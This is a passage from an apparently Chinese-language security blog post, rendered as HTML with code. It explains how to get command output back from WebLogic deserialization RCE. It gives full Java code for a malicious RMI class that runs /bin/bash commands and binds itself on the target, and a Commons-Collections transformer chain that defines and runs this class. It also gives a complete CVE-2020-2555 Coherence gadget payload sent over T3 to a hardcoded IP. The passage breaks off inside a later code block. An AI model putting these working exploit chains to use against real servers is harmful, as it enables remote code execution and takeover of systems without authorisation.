RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>2.实现这个接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EchoImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Echo</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">exec</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            in = Runtime.getRuntime().exec(cmd).getInputStream();<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        java.util.<span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(in).useDelimiter(<span class="hljs-string">&quot;\\a&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> s.hasNext()?s.next():<span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>3.服务端绑定EchoImpl </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EchoServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Echo</span> <span class="hljs-variable">echo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EchoImpl</span>();<br>        <span class="hljs-type">Echo</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> (Echo) UnicastRemoteObject.exportObject(echo,<span class="hljs-number">9999</span>);<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span>  LocateRegistry.createRegistry(<span class="hljs-number">9999</span>);<br>        registry.bind(<span class="hljs-string">&quot;Echo&quot;</span>,e);<br>        System.out.println(<span class="hljs-string">&quot;Start RMI Server................&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>4.客户端实现RMI远程方法调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">9999</span>);<br>        <span class="hljs-type">Echo</span> <span class="hljs-variable">echo</span> <span class="hljs-operator">=</span> (Echo) registry.lookup(<span class="hljs-string">&quot;Echo&quot;</span>);<br>        System.out.println(echo.exec(<span class="hljs-string">&quot;ipconfig&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最终实现效果<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211902141.png" alt="图片"></p><p>上面RMI回显原理有了，我们有了回显的方法，现在只需再RCE的漏洞利用中，重现构造出上述步骤。</p><p><strong>逻辑思路</strong></p><ul><li>利用漏洞点调用ClassLoader的defineClass方法 </li><li>写入类：defineClass在目标服务器运行返回我们构造的类(已经写好的RMI接口类) </li><li>绑定类：将RMI接口类绑定到目标服务器，也就是将我们构造的恶意类注册到rmi注册中心 </li><li>攻击者本地远程调用方法获取回显结果</li></ul><p><strong>首先，我们先将需要绑定的恶意类准备好。</strong></p><p>我们需要目标存在一个继承了Remote的接口，并且接口方法返回类型为String(因为要返回命令执行的结果)且抛出RemoteException异常，然后本地构造一个类实现这个接口。</p><p>直接在Remote类下Ctrl+H <img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211903276.png" alt="图片"></p><p>weblogic_cmd用的是这个<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211904479.png" alt="图片"></p><p>本地构造EvilImpl </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClusterMasterRemote</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setServerLocation</span><span class="hljs-params">(String s, String s1)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><br><br>    &#125;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServerLocation</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br><br><br>            List&lt;String&gt; cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;String&gt;();<br><br><br>            cmds.add(<span class="hljs-string">&quot;/bin/bash&quot;</span>);<br>            cmds.add(<span class="hljs-string">&quot;-c&quot;</span>);<br>            cmds.add(cmd);<br><br><br>            <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">processBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmds);<br>            processBuilder.redirectErrorStream(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">proc</span> <span class="hljs-operator">=</span> processBuilder.start();<br><br><br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">br</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(proc.getInputStream()));<br>            <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br><br><br>            String line;<br>            <span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                sb.append(line).append(<span class="hljs-string">&quot;\n&quot;</span>);<br>            &#125;<br><br><br>            <span class="hljs-keyword">return</span> sb.toString();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> e.getMessage();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>恶意类准备好了，接下来就是绑定到目标服务器。这里使用到的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">RemoteImpl</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteImpl</span>();<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">Context</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>    context.rebind(<span class="hljs-string">&quot;Evil&quot;</span>,remote);<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    e.printStackTrace();<br>&#125;<br></code></pre></td></tr></table></figure><p>在服务端执行上述代码即可将而已类绑定到目标服务器，问题是我们怎么执行上述代码？</p><p>将上述代码写到我们构造的EvilImpl main方法中，definClass获取到EvilImpl 的 Class后直接利用<strong>CC</strong>或者<strong>coherence</strong>进行反射调用。</p><p>所以我们修改EvilImpl如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClusterMasterRemote</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">EvilImpl</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EvilImpl</span>();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Context</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>            context.rebind(<span class="hljs-string">&quot;Evil&quot;</span>,remote);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setServerLocation</span><span class="hljs-params">(String s, String s1)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><br><br>    &#125;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServerLocation</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br><br><br>            List&lt;String&gt; cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;String&gt;();<br><br><br>            cmds.add(<span class="hljs-string">&quot;/bin/bash&quot;</span>);<br>            cmds.add(<span class="hljs-string">&quot;-c&quot;</span>);<br>            cmds.add(cmd);<br><br><br>            <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">processBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmds);<br>            processBuilder.redirectErrorStream(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">proc</span> <span class="hljs-operator">=</span> processBuilder.start();<br><br><br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">br</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(proc.getInputStream()));<br>            <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br><br><br>            String line;<br>            <span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                sb.append(line).append(<span class="hljs-string">&quot;\n&quot;</span>);<br>            &#125;<br><br><br>            <span class="hljs-keyword">return</span> sb.toString();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> e.getMessage();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p><strong>下面还剩最后一个问题，获取defineClass</strong>，有多种实现方式，可以在Weblogic中找ClassLoader的子类，也可以从Thread中获取，也可直接反射调用。</p><h6 id="2-Weblogic-结合CC链-回显实现"><a href="#2-Weblogic-结合CC链-回显实现" class="headerlink" title="(2) Weblogic 结合CC链 回显实现"></a><strong>(2) Weblogic 结合CC链 回显实现</strong></h6><p>上面回显原理已经将大体流程说明完毕，CC的引入就是为了解决两个问题，defineClass的获取，以及EvilImpl类main方法的反射调用。</p><p><strong>defineClass的获取</strong></p><p>网上大多是直接找的ClassLoader的子类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">jxxload_help.PathVFSJavaLoader#loadClassFromBytes<br>org.python.core.BytecodeLoader1#loadClassFromBytes<br>sun.org.mozilla.javascript.internal.DefiningClassLoader#defineClass<br>java.security.SecureClassLoader#defineClass(java.lang.String, <span class="hljs-type">byte</span>[], <span class="hljs-type">int</span>, <span class="hljs-type">int</span>, java.security.CodeSource)<br>org.mozilla.classfile.DefiningClassLoader#defineClass<br></code></pre></td></tr></table></figure><p> org.mozilla.classfile.DefiningClassLoader#defineClass 使用这个</p><p><strong>CC链构造</strong></p><p>接下来就是结合CC利用链进行构造，首先获取defineClass，然后调用我们EvilImple的main方法。CC是可以调用任意类的任意方法的，所以构造起来也很容易(当然了，是站在前人的肩膀上，手动狗头)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(DefiningClassLoader.class),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getDeclaredConstructor&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newInstance&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;defineClass&quot;</span>,<br>                           <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, <span class="hljs-type">byte</span>[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;className, clsData&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;main&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String[].class&#125;&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>())<br>&#125;;<br></code></pre></td></tr></table></figure><p>至此，整个回显过程就串起来了，weblogic的反序列化RCE为漏洞点，CC链串起来回显的整个过程：从defineClass的调用到EvilImple的绑定，最后攻击者本地调用远程方法即可实现回显。</p><h6 id="3-Weblogic-结合coherence链回显实现"><a href="#3-Weblogic-结合coherence链回显实现" class="headerlink" title="(3) Weblogic 结合coherence链回显实现"></a>(3) Weblogic 结合coherence链回显实现</h6><p>虽然上述回显已经成功，但是CC链早就被Weblogic放入了黑名单，且在18年补丁之后，Weblogic修改了自身的cc依赖，使之不能反序列化。新的漏洞需要实现回显，需要重新找出一个可以替代CC的链 —&gt; coherence中的LimitFilter</p><p>首先复习以下CVE-2020-2555的利用链 BadAttributeValueExpException -&gt; readObject -&gt; LimitFilte的toString(Coherence中) -&gt; ReflectionExtractor的extract() -&gt; method.invoke() </p><p>payload如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-comment">// Runtime.class.getRuntime()</span><br>        <span class="hljs-type">ReflectionExtractor</span> <span class="hljs-variable">extractor1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionExtractor</span>(<br>                <span class="hljs-string">&quot;getMethod&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;<br><br><br>        );<br><br><br>        <span class="hljs-comment">// get invoke() to execute exec()</span><br>        <span class="hljs-type">ReflectionExtractor</span> <span class="hljs-variable">extractor2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionExtractor</span>(<br>                <span class="hljs-string">&quot;invoke&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;<br><br><br>        );<br><br><br>        <span class="hljs-comment">// invoke(&quot;exec&quot;,&quot;calc&quot;)</span><br>        <span class="hljs-type">ReflectionExtractor</span> <span class="hljs-variable">extractor3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionExtractor</span>(<br>                <span class="hljs-string">&quot;exec&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;calc&quot;</span>&#125;&#125;<br>        );<br><br><br>        ReflectionExtractor[] extractors = &#123;<br>                extractor1,<br>                extractor2,<br>                extractor3,<br>        &#125;;<br><br><br>        <span class="hljs-type">ChainedExtractor</span> <span class="hljs-variable">chainedExtractor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedExtractor</span>(extractors);<br>        <span class="hljs-type">LimitFilter</span> <span class="hljs-variable">limitFilter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LimitFilter</span>();<br><br><br>        <span class="hljs-comment">//m_comparator</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">m_comparator</span> <span class="hljs-operator">=</span> limitFilter.getClass().getDeclaredField(<span class="hljs-string">&quot;m_comparator&quot;</span>);<br>        m_comparator.setAccessible(<span class="hljs-literal">true</span>);<br>        m_comparator.set(limitFilter, chainedExtractor);<br><br><br>        <span class="hljs-comment">//m_oAnchorTop</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">m_oAnchorTop</span> <span class="hljs-operator">=</span> limitFilter.getClass().getDeclaredField(<span class="hljs-string">&quot;m_oAnchorTop&quot;</span>);<br>        m_oAnchorTop.setAccessible(<span class="hljs-literal">true</span>);<br>        m_oAnchorTop.set(limitFilter, Runtime.class);<br><br><br>        <span class="hljs-comment">// BadAttributeValueExpException toString()</span><br>        <span class="hljs-comment">// This only works in JDK 8u76 and WITHOUT a security manager</span><br>        <span class="hljs-comment">// https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(badAttributeValueExpException, limitFilter);<br><br><br>        <span class="hljs-comment">// serialize</span><br>        <span class="hljs-type">byte</span>[] payload = Serializables.serialize(badAttributeValueExpException);<br><br><br>        <span class="hljs-comment">// T3 send, you can also use python script. weblogic_t3.py</span><br>        T3ProtocolOperation.send(<span class="hljs-string">&quot;10.251.0.116&quot;</span>, <span class="hljs-string">&quot;7001&quot;</span>, payload);<br><br><br>        <span class="hljs-comment">// test</span><br>        serialize(badAttributeValueExpException);<br>        System.out.print(payload);<br><span class="hljs-comment">//        deserialize();</span><br><br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;w2555.ser&quot;</span>));<br>            os.writeObject(obj);<br>            os.close();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserialize</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;test.ser&quot;</span>));<br>            is.readObject();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>看到无回显的CVE-2020-2555 payload 对于com.tangosol.util.filter.LimitFilter 的利用看起来真是似曾相识(commons-collections),，com.tangosol.util.extractor.ReflectionExtractor#extract中，调用了 invoke ,类比于CC中transform的invoke，模仿CC的回显思路，构造coherence的回显，关键的ReflectionExtractor[]构造如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><br>ValueExtractor[] valueExtractors = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ValueExtractor</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionExtractor</span>(<span class="hljs-string">&quot;getDeclaredConstructor&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionExtractor</span>(<span class="hljs-string">&quot;newInstance&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionExtractor</span>(<span class="hljs-string">&quot;defineClass&quot;</span>,<br>                           <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, <span class="hljs-type">byte</span>[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;className, clsData&#125;),<br>    <span class="hljs-keyword">new</span> <span 